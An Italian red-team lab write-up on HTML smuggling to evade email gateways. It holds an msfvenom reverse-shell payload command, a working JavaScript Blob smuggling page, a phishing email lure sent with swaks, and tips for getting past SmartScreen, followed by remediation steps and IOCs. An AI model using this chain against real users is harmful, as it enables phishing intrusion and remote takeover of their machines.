> [English](README.en.md) | **Italiano**

# HTML Smuggling - Bypass Email Gateway via Client-Side Assembly

> - **Fase:** Social Engineering - Payload Delivery via HTML Smuggling
> - **Visibilita:** Bassa in transito (il file HTML e legittimo per i filtri) / Alta all'esecuzione (il payload ricostruito triggera AV/EDR al download o esecuzione)
> - **Prerequisiti:** Payload generato con msfvenom o custom; conoscenza JavaScript (Blob API, anchor element); server web o email per delivery del file HTML; handler in ascolto per il callback
> - **Output:** SE-008 (bypass email gateway tramite blob JavaScript download, payload .exe ricostruito lato client - severity Alto)

- **Ambiente Operativo:** Kali Linux Purple (Attaccante), Windows 10 VM con Chrome/Edge (Vittima)
- **Target:** Email gateway simulato (Mailhog), utente che apre allegato HTML
- **Tecniche Documentate:** JavaScript Blob API, Base64 Encoding, Auto-Download Trigger

---

## Executive Summary

HTML Smuggling e una tecnica di delivery che sfrutta le funzionalita native del browser per assemblare un file malevolo direttamente sulla macchina della vittima. A differenza degli allegati tradizionali (.exe, .docm) che vengono analizzati dai filtri email gateway in transito, l'HTML Smuggling consegna solo un file HTML contenente codice JavaScript legittimo. Il payload e codificato in Base64 all'interno dello script e viene decodificato, assemblato in un Blob, e offerto come download automatico solo quando la vittima apre il file nel browser.

Questa tecnica e stata utilizzata in campagne APT reali documentate: Nobelium/APT29 (SolarWinds) l'ha impiegata nel 2021 per distribuire Cobalt Strike, e diversi gruppi ransomware la utilizzano correntemente per bypassare i controlli perimetrali.

---

## HTML Smuggling: Bypass Filtri Server-Side

**ID Finding:** `SE-008` | **Severity:** `Alto`

### Contesto operativo

Il laboratorio ha creato un file HTML che, quando aperto nel browser della vittima, assembla e scarica automaticamente un payload .exe tramite JavaScript Blob API. Il file HTML e stato inviato come allegato email attraverso un email gateway simulato (Mailhog): il gateway non ha rilevato contenuto malevolo perche il payload non esiste come file fino al momento dell'apertura nel browser.

### PoC - Fase 1: Generazione Payload e Encoding

```Bash
# Generazione payload
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.110 LPORT=4444 -f exe -o update_security.exe
```

```
Payload size: 510 bytes
Final size of exe file: 7168 bytes
Saved as: update_security.exe
```

```Bash
# Encoding in Base64 per embedding
base64 -w 0 update_security.exe > payload_b64.txt
cat payload_b64.txt | wc -c
```

```
9560                                                        <-- dimensione Base64 (compatta)
```

### PoC - Fase 2: Creazione File HTML con Smuggling

```html
<!-- security_update.html -->
<html>
<head><title>Aggiornamento di Sicurezza</title></head>
<body>
<h2>Download in corso...</h2>
<p>Il tuo aggiornamento di sicurezza si avviera automaticamente.</p>
<script>
// Payload encoded in Base64
var payload_b64 = "TVqQAAMAAAAEAAAA..."; // [contenuto da payload_b64.txt]

// Decodifica Base64 -> array di byte
var byteChars = atob(payload_b64);
var byteArray = new Uint8Array(byteChars.length);
for (var i = 0; i < byteChars.length; i++) {
    byteArray[i] = byteChars.charCodeAt(i);
}

// Creazione Blob e trigger download automatico
var blob = new Blob([byteArray], {type: 'application/octet-stream'});
var url = window.URL.createObjectURL(blob);                 // <-- file assemblato in memoria
var a = document.createElement('a');
a.href = url;
a.download = 'SecurityUpdate_v3.2.1.exe';                  // <-- nome file convincente
document.body.appendChild(a);
a.click();                                                  // <-- download automatico
</script>
</body>
</html>
```

### PoC - Fase 3: Delivery via Email e Verifica Bypass

```Bash
# Invio email con allegato HTML tramite SMTP (o GoPhish)
swaks --to victim@company-lab.local --from security@company-lab.local \
  --server 127.0.0.1:25 \
  --header "Subject: [URGENTE] Aggiornamento di sicurezza obbligatorio" \
  --body "Aprire il file allegato per installare l'aggiornamento." \
  --attach security_update.html
```

```
=== Trying 127.0.0.1:25...
=== Connected to 127.0.0.1.
 -> 250 Ok: queued                                          <-- email accettata dal gateway
                                                            <-- nessun alert: solo file HTML
```

### PoC - Fase 4: Esecuzione e Callback

```
# La vittima apre l'allegato HTML nel browser:
# 1. Chrome apre security_update.html
# 2. JavaScript si esegue automaticamente
# 3. Il browser mostra "SecurityUpdate_v3.2.1.exe" nella barra download
# 4. Se la vittima esegue il file -> reverse shell

[*] Meterpreter session 1 opened (192.168.0.110:4444 -> 192.168.0.120:49821)    <-- SE-008
```

### Remediation

- **Azione immediata:** blocco dell'esecuzione del payload scaricato; quarantena del file HTML originale; analisi del codice JavaScript per estrarre IOC (URL di callback, nome file)
- **Azione strutturale:** configurazione email gateway per sandboxing degli allegati HTML (esecuzione in ambiente isolato che rileva il download automatico); abilitazione SmartScreen per file scaricati; browser isolation per email con allegati HTML; disabilitazione JavaScript rendering negli allegati email (Outlook: "Read as plain text")
- **Verifica:** invio di HTML di test con payload benigno - il gateway deve rilevare il comportamento di download automatico e bloccare o mettere in quarantena l'allegato

---

## Esperienza di Laboratorio

Il primo tentativo ha utilizzato un payload .exe di 7 KB embedded nel file HTML. Il file HTML risultante era di circa 15 KB - dimensione perfettamente plausibile per un allegato email. La verifica con Mailhog (email gateway di test) ha confermato che il file HTML transita senza alcun alert: per il gateway e un allegato HTML legittimo.

Il problema emerso durante il test e stato il comportamento dei browser moderni: Chrome mostra un avviso nella barra di download per file .exe scaricati, e SmartScreen su Windows puo bloccare l'esecuzione. Per aggirare questo (in un engagement reale), si usano formati meno sospetti: .iso, .zip (che contengono il payload), o si redirige l'utente verso una pagina di istruzioni che lo guida ad accettare i warning.

Un'osservazione importante: la tecnica funziona anche quando il file HTML e ospitato su un server web (non solo come allegato email). In questo caso, il link nell'email punta alla pagina HTML e il download si avvia quando la vittima visita l'URL. Questo approccio e piu furtivo perche non c'e allegato da analizzare.

---

## Analisi Teorica: Perche i Gateway Falliscono

I filtri email gateway operano con un modello di analisi statica: ispezionano gli allegati come file, cercando signature di malware, analizzando le strutture PE (Portable Executable), ed eseguendo sandboxing dei file eseguibili. HTML Smuggling sfrutta il gap architetturale tra analisi server-side e esecuzione client-side.

Il file HTML contiene solo codice JavaScript legittimo - le funzioni `atob()`, `Blob()`, `URL.createObjectURL()` sono API standard del browser, utilizzate da milioni di applicazioni web legittime per gestire download di file. Il payload e codificato in Base64, che per un filtro e semplicemente una stringa di testo. Il file malevolo non esiste come entita analizzabile fino al momento in cui il browser della vittima esegue il JavaScript e assembla i byte in memoria.

La tecnica e stata documentata in campagne APT di alto profilo: Nobelium (APT29) l'ha utilizzata nel maggio 2021 per distribuire Cobalt Strike beacon mascherato da aggiornamento di sicurezza. Il gruppo Mango Sandstorm (ex-PHOSPHORUS) l'ha impiegata nel 2023 per distribuire backdoor contro organizzazioni israeliane. La diffusione della tecnica ha spinto Microsoft a introdurre l'ASR rule "Block JavaScript or VBScript from launching downloaded executable content" come contromisura specifica.

---

## Scenario Reale: Proiezione Post-Exploitation

> Questa sezione descrive come questo finding si inserirebbe in un engagement reale.

### Prospettiva Attaccante (Red Team)

**Punto di partenza:** payload .exe scaricato ed eseguito dalla vittima (SE-008).

**Kill Chain proiettata:**

```
[SE-008] HTML Smuggling -> payload scaricato -> esecuzione
        |
        v
Reverse shell Meterpreter -> process migration (evasione)
        |
        v
Credential Harvesting -> Mimikatz / LSASS dump
        |
        v
Lateral Movement -> PsExec / WMI verso host interni
```

### Prospettiva Difensore (Blue Team)

**IOC da monitorare:**
- Download di .exe da file HTML locale (Event ID Sysmon 11: FileCreate con Zone.Identifier)
- Processo figlio di browser (chrome.exe/msedge.exe) che esegue .exe scaricato
- Allegati email HTML con JavaScript offuscato o stringhe Base64 lunghe
- ASR rule trigger: "Block JavaScript from launching downloaded executable content"

---

## Mappatura MITRE ATT&CK

| Tattica | Tecnica | ID MITRE | Descrizione dell'Azione |
| :--- | :--- | :--- | :--- |
| Resource Development | Develop Capabilities: Malware | `T1587.001` | Creazione file HTML con payload embedded in Base64 |
| Initial Access | Phishing: Spearphishing Attachment | `T1566.001` | File HTML inviato come allegato email (SE-008) |
| Defense Evasion | Obfuscated Files or Information: HTML Smuggling | `T1027.006` | Payload assemblato lato client via JavaScript Blob API |
| Execution | User Execution: Malicious File | `T1204.002` | La vittima esegue il file .exe scaricato dal browser |
| Execution | Command and Scripting Interpreter: JavaScript | `T1059.007` | JavaScript nel file HTML decodifica e assembla il payload |
| Command and Control | Non-Standard Port | `T1571` | Reverse TCP Meterpreter su porta 4444 |

---

> **Nota:** Tutte le attivita documentate sono state condotte in un ambiente di laboratorio virtualizzato. I file HTML malevoli sono stati testati esclusivamente su macchine virtuali di proprieta dell'autore.
